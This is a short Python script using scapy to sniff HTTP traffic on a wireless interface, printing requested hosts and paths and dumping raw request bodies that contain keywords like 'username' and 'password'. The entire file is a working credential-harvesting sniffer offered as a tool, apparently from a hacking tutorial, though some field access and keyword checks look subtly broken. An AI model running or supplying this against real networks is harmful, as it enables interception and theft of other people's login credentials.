#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_packet_sniffed)



def process_packet_sniffed(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet[http.HTTPRequest.Host] + packet[http.HTTPRequest.Path])
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break


sniff("wlp13s0")
